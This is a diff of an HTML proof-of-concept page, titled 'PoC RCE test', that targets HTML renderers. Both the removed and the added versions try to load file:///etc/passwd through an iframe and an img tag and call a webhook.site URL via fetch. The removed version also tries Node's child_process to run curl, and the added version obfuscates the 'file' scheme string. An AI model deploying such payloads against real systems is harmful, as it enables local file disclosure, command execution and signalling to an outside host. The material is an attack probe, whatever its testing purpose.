@@ -1,24 +1,10 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <title>PoC RCE test</title>
-</head>
-<body>
-  <!-- Forzamos carga de archivo local en sistemas Unix -->
-  <iframe src="file:///etc/passwd"></iframe>
+<script>
+  var path = "f" + "ile" + ":///etc/passwd";
+  var url = "https://webhook.site/e7e51d1c-b882-4d14-b4db-ba745f8a2525?leak=1";
 
-  <!-- Si carga falla, dispara exfiltración -->
-  <img src="file:///etc/passwd"
-       onerror="fetch('https://webhook.site/e7e51d1c-b882-4d14-b4db-ba745f8a2525?leaked=etc-passwd')" />
-
-  <!-- Variante de prueba adicional (cmd en sandbox Node.js) -->
-  <script>
-    try {
-      var exec = Function("return require('child_process').exec")();
-      exec("curl https://webhook.site/e7e51d1c-b882-4d14-b4db-ba745f8a2525?cmd=executed");
-    } catch(e) {
-      fetch("https://webhook.site/e7e51d1c-b882-4d14-b4db-ba745f8a2525?error=" + encodeURIComponent(e.message));
-    }
-  </script>
-</body>
-</html>
+  try {
+    fetch(url);
+  } catch (e) {}
+</script>
+<iframe src=path></iframe>
+<img src=path onerror="fetch(url)">
